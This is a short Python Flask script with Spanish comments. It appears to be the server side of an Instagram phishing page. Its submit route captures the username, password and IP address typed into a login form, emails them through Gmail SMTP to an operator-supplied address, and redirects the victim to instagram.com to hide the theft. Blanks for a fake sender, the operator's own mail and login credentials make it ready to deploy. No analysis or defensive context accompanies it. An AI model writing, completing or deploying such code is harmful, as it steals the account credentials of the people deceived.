from flask import Flask, render_template, request, redirect
import smtplib
from email.message import EmailMessage
from datetime import datetime

app = Flask(__name__, static_folder='static', static_url_path='')

def get_client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"

def append_row(username, password, ip):
    msg = EmailMessage()
    p = request.form.get("persona") 
    print (p)
    msg['Subject'] = 'Nuevo registro'
    msg['From'] = '' #rellenar con el MAIL FAKE
    msg['To'] = '' #rellenar con TU mail
    msg.set_content('('+ip+') '+username+':'+password)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('primero el usuario', 'luego la contraseña') #rellenar con CREDENCIALES
        smtp.send_message(msg)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    username = (request.form.get("username") or "").strip()
    password = (request.form.get("password") or "").strip()
    ip = get_client_ip()
    append_row(username, password, ip)
    return redirect("http://www.instagram.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
